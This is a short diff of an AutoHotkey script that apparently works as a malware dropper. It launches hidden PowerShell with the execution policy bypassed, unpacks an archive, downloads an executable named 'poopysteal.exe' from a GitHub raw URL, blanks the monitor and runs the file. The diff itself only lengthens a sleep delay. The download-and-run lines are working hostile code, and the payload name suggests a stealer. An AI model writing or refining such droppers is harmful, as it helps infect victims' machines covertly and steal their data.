@@ -4,7 +4,7 @@ Sleep, 5000
 Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Expand-Archive -Path poop.zip -DestinationPath .
 Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
 SendMessage,0x112,0xF170,2,,Program Manager
-Sleep, 2000
+Sleep, 5000
 Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-Item .\poop.exe
 
 
